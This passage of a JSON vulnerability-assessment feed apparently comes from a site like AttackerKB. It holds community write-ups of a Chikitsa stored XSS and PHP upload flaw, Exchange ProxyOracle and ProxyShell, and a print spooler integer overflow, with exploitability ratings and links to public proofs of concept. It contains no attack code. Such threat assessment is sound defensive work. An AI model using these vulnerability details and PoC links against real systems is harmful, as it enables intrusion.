      "document": "CVE-mitre:index.php/appointment/insert_patient_add_appointment in Chikitsa Patient Management System 2.0.0 allows XSS.\r\nnu11secur1ty: XSS-Stored \u2013 Brutal PWNED on Chikitsa 2.0.0 parameter \u201cname\u201d + User: Unrestricted File Upload \u201c.php\u201d\r\n# Reproduce:\r\nhttps://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-38152\r\n# Proof:\r\nhttps://streamable.com/wbo5c1",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "fd7c1537-a790-4180-8def-48157ae59a33",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "223ac3bf-ad6e-4aea-960a-de258ee301a0",
      "created": "2021-08-09T20:19:14.228017Z",
      "revisionDate": "2021-08-09T20:19:14.22636Z",
      "document": "PoC is publicly available https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html?m=1\r\nMicrosoft has already patched this vulnerabilities and exploitation has not been observed. However, threat actors could exploit these vulnerabilities by sending users an email to visit a malicious link and recover passwords in plaintext. ",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "85a30c9a-e126-4ec0-bda4-d166e03c5390",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "a0da0b6d-eaf1-48c6-b4f0-840aeebb70de",
      "created": "2021-08-10T21:35:00.842498Z",
      "revisionDate": "2021-08-10T23:13:08.68956Z",
      "document": "This entry is based off the blackhat talk by  Zhiniang Peng, Xuefeng Li, and Lewis Lee on August 4, 2021.\r\n\r\nThey said CVE-2021-24088, 24077, and 1722 were all similar, but only described 24088.\r\nFor 24088, there's a bug in `EnumJobsInLocalQueue` where the user submits a buffer and job size.  Because the buffer used in this case has metadata written to the top of the buffer and strings written to the bottom of the buffer, the buffer functionally grows toward the middle (AKA itself).  There bug is in the check to ensure proper size of the buffer so that it does not cause an overwrite of the string data to the metadata, but that check is vulnerable to an integer overflow (I am not sure of the exact cause).  Because the check can be bypassed using the integer overflow, it means someone can arbitrarily write data in the form of a string to the meta data section, or even underflow the address and write arbitrary data to adjacent heap allocations.\r\nBecause the nature of the exploit, being able to write arbitrary data to the heap could result in code execution, but as I have not seen a PoC that goes through all the steps, I'm unable to say definitively how easy the exploit is to create or run or what the attacker value is.  Mitigations are as always, patch, and/or disable the spooler service on devices that do not need it.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "79a1dd8d-aada-42f6-a94f-6fb84ff04cc6",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "116fdae6-8c6e-473e-8d39-247560d01c09",
      "created": "2021-08-12T21:19:38.007841Z",
      "revisionDate": "2021-08-25T21:42:43.356646Z",
      "document": "Check out the [Rapid7 analysis](https://attackerkb.com/topics/xbr3tcCFT3/proxyshell-exploit-chain/rapid7-analysis) for details on the exploit chain. Seems like a lot of the PoC implementations so far are using admin mailboxes, but I'd imagine folks are going to start finding ways around that soon.",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    }
  ]
}